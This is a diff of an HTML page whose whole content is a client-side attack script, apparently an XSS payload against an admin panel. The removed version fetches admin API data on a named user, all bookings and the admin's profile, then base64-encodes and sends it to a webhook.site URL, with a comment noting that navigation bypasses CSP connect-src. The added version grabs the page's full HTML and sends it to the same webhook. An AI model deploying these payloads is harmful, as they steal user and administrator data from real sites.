@@ -3,30 +3,13 @@
 <body>
     <script>
         const webh = "https://webhook.site/d46b46e3-a9c2-4a1c-816f-c3156dbbd093";
-        const elenaId = "69d29dc2d8e73faab806acf3";
-
-        async function finalExfiltrate() {
-            try {
-                // Fetch the three key targets
-                const p1 = fetch(`/api/admin/users/${elenaId}`).then(r => r.json());
-                const p2 = fetch('/api/admin/bookings').then(r => r.json());
-                const p3 = fetch('/api/auth/profile').then(r => r.json());
-
-                const [elena, bookings, profile] = await Promise.all([p1, p2, p3]);
-                
-                const data = JSON.stringify({ elena, bookings, profile });
-                
-                // Navigation bypasses CSP connect-src
-                window.location.replace(`${webh}?dump=${btoa(data)}`);
-            } catch (e) {
-                // Fallback: Just try to leak the Admin's own profile if the rest fails
-                fetch('/api/auth/profile').then(r => r.text()).then(d => {
-                    window.location.replace(`${webh}?fallback=${btoa(d)}`);
-                });
-            }
-        }
-
-        finalExfiltrate();
+        
+        // Capture everything inside the <html> tags
+        const fullHTML = document.documentElement.innerHTML;
+        
+        // Redirect to leak the data. 
+        // We use encodeURIComponent because HTML is too large for btoa() sometimes
+        window.location.href = webh + "?html_leak=" + btoa(unescape(encodeURIComponent(fullHTML.substring(0, 5000))));
     </script>
 </body>
 </html>
